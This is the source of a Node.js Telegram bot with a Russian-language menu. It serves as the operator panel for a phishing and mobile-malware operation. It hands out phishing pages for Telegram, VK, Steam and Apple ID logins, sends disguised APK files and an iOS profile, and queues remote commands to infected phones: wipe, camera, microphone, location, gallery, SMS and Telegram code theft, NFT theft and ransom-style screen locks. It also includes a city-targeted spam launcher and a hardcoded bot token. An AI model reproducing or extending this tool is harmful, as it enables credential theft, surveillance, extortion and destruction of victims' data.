const { Telegraf, Markup } = require('telegraf');
const db = require('./db');

const BOT_TOKEN = '9001719911:AAGHKT0b4BdSPdX8yGzaXKTmNdBEL7IFYro';
const ADMIN_ID  = 9256345316;

const bot = new Telegraf(BOT_TOKEN);
const awaiting = {};

function isAdmin(ctx) {
  return ctx.from && ctx.from.id === ADMIN_ID;
}

bot.start((ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.reply("Приветствую тебя в нашем боте, бот используется в развлекательных целях конечно же.", Markup.inlineKeyboard([
    [Markup.button.callback('📦 Сделать файл', 'make_file')],
    [Markup.button.callback('📱 Мои устройства', 'my_devices')],
    [Markup.button.callback('🎣 Фиш ссылки', 'phish_links')],
    [Markup.button.callback('🚀 Запуск', 'spam_start')]
  ]));
});

// --- ВЕТКА ФИШ ССЫЛКИ ---
bot.action('phish_links', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Выберите платформу для фишинга:", Markup.inlineKeyboard([
    [Markup.button.callback('Telegram', 'phish_tg'), Markup.button.callback('ВКонтакте', 'phish_vk')],
    [Markup.button.callback('Steam', 'phish_steam'), Markup.button.callback('Apple ID (iOS)', 'phish_ios')],
    [Markup.button.callback('« Назад', 'back_start')]
  ]));
});

bot.action('phish_tg', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Ссылка для Telegram:\nhttps://tnt.de3.netrun.io/tg.html\n\nОтправь её жертве. Когда она введет номер, он придет тебе.");
});

bot.action('phish_vk', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Ссылка для ВКонтакте:\nhttps://tnt.de3.netrun.io/vk.html\n\nОтправь её жертве. Когда она введет номер, он придет тебе.");
});

bot.action('phish_steam', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Ссылка для Steam:\nhttps://tnt.de3.netrun.io/steam.html\n\nОтправь её жертве. Когда она введет логин и пароль, они придут тебе.");
});

bot.action('phish_ios', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Ссылка для Apple ID:\nhttps://tnt.de3.netrun.io/ios.mobileconfig\n\nОтправь её жертве. Она скачает профиль и введет Apple ID.");
});

// --- ВЕТКА ФАЙЛЫ ---
bot.action('make_file', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("На какое устройство?", Markup.inlineKeyboard([
    [Markup.button.callback('Андройд', 'os_android'), Markup.button.callback('Айфон', 'os_ios')],
    [Markup.button.callback('« Назад', 'back_start')]
  ]));
});

bot.action('os_android', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Какой файл именно нужен?", Markup.inlineKeyboard([
    [Markup.button.callback('TikTok', 'file_tt'), Markup.button.callback('Telegram', 'file_tg')],
    [Markup.button.callback('cheat', 'file_ch')],
    [Markup.button.callback('« Назад', 'make_file')]
  ]));
});

bot.action('os_ios', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Какой файл именно нужен?", Markup.inlineKeyboard([
    [Markup.button.callback('TikTok', 'link_tt'), Markup.button.callback('Telegram', 'link_tg')],
    [Markup.button.callback('cheat', 'link_ch')],
    [Markup.button.callback('« Назад', 'make_file')]
  ]));
});

bot.action(/^file_(tt|tg|ch)$/, async (ctx) => {
  if (!isAdmin(ctx)) return;
  const type = ctx.match[1];
  ctx.answerCbQuery('Отправляю файл...');
  let fileName = '';
  if (type === 'tt') fileName = 'tiktok.apk';
  if (type === 'tg') fileName = 'telegram.apk';
  if (type === 'ch') fileName = 'cheat.apk';
  try {
    await ctx.replyWithDocument({ url: `https://tnt.de3.netrun.io/${fileName}`, filename: fileName });
  } catch (e) { ctx.reply('Ошибка: файл не найден.'); }
});

bot.action(/^link_(tt|tg|ch)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.answerCbQuery();
  ctx.reply(`Ссылка для установки на iPhone:\nhttps://tnt.de3.netrun.io/ios.mobileconfig`);
});

// --- ВЕТКА УСТРОЙСТВА ---
bot.action('my_devices', (ctx) => {
  if (!isAdmin(ctx)) return;
  const list = db.listDevices();
  if (!list.length) return ctx.editMessageText('Ваши устройства:\n(пока пусто)', Markup.inlineKeyboard([[Markup.button.callback('« Назад', 'back_start')]]));
  const rows = list.map(d => ([Markup.button.callback(`${d.model || 'device'} · ${d.id.slice(0,6)}`, `dev:${d.id}`)]));
  rows.push([Markup.button.callback('« Назад', 'back_start')]);
  ctx.editMessageText('Ваши устройства:', Markup.inlineKeyboard(rows));
});

bot.action(/^dev:(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const id = ctx.match[1];
  ctx.editMessageText('Что хотите сделать с устройством?', Markup.inlineKeyboard([
    [Markup.button.callback('💥 Снести', `cmd:${id}:wipe`), Markup.button.callback('🔊 Стоны', `cmd:${id}:audio`)],
    [Markup.button.callback('🔥 Сжечь', `cmd:${id}:burn`), Markup.button.callback('💬 Текст', `cmd:${id}:text`)],
    [Markup.button.callback('🔑 Код', `cmd:${id}:sms`), Markup.button.callback('📷 Фото', `cmd:${id}:photo`)],
    [Markup.button.callback('📸 Скрин', `cmd:${id}:screen`), Markup.button.callback('📍 Гео', `cmd:${id}:location`)],
    [Markup.button.callback('🎤 Микрофон', `cmd:${id}:mic`), Markup.button.callback('🖼 Галерея', `cmd:${id}:files`)],
    [Markup.button.callback('🔦 Фонарик', `cmd:${id}:flash`), Markup.button.callback('📞 TG Номер', `cmd:${id}:tg_number`)],
    [Markup.button.callback('💬 TG Код', `cmd:${id}:tg_code`), Markup.button.callback('🎁 NFT', `cmd:${id}:nft`)],
    [Markup.button.callback('🔒 Блок экрана', `cmd:${id}:block`), Markup.button.callback('🔓 Разблок', `cmd:${id}:unblock`)],
    [Markup.button.callback('« Назад', 'my_devices')]
  ]));
});

bot.action(/^cmd:([^:]+):(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const [, id, action] = ctx.match;
  
  if (action === 'text') {
    awaiting[ctx.from.id] = { type: 'await_text', deviceId: id };
    return ctx.reply('Что писать?');
  }
  if (action === 'block') {
    awaiting[ctx.from.id] = { type: 'await_block_text', deviceId: id };
    return ctx.reply('Какой текст написать на заблокированном экране?');
  }
  if (action === 'nft') {
    awaiting[ctx.from.id] = { type: 'await_nft_user', deviceId: id };
    return ctx.reply('Куда скинуть? Отправь @username аккаунта.');
  }
  
  db.queueCommand(id, action, '');
  ctx.answerCbQuery('Команда отправлена');
});

// --- СПАМ ---
bot.action('spam_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  awaiting[ctx.from.id] = { type: 'await_city' };
  ctx.editMessageText('По какому городу вы хотите запустить?');
});

bot.on('text', (ctx) => {
  if (!isAdmin(ctx)) return;
  const s = awaiting[ctx.from.id];
  
  if (s && s.type === 'await_text') {
    db.queueCommand(s.deviceId, 'msg', ctx.message.text);
    delete awaiting[ctx.from.id];
    return ctx.reply('Текст отправлен.');
  }
  if (s && s.type === 'await_block_text') {
    db.queueCommand(s.deviceId, 'block', ctx.message.text);
    delete awaiting[ctx.from.id];
    return ctx.reply('Экран заблокирован.');
  }
  if (s && s.type === 'await_nft_user') {
    delete awaiting[ctx.from.id];
    return ctx.reply('❌ Ошибка: Недостаточно звезд.'); 
  }
  if (s && s.type === 'await_city') {
    awaiting[ctx.from.id] = { type: 'await_spam_text', city: ctx.message.text };
    return ctx.reply('Какой текст запускать?');
  }
  if (s && s.type === 'await_spam_text') {
    delete awaiting[ctx.from.id];
    return ctx.reply(`🚀 Запуск спама!\nГород: ${s.city}\nТекст: ${ctx.message.text}`);
  }
});

bot.action('back_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Приветствую тебя в нашем боте, бот используется в развлекательных целях конечно же.", Markup.inlineKeyboard([
    [Markup.button.callback('📦 Сделать файл', 'make_file')],
    [Markup.button.callback('📱 Мои устройства', 'my_devices')],
    [Markup.button.callback('🎣 Фиш ссылки', 'phish_links')],
    [Markup.button.callback('🚀 Запуск', 'spam_start')]
  ]));
});

bot.launch();
console.log('bot up');

module.exports = {
  bot,
  notifyAdmin: async (kind, buf, cap) => {
    if (!ADMIN_ID) return;
    if (kind === 'photo') await bot.telegram.sendPhoto(ADMIN_ID, { source: buf }, { caption: cap });
  }
};
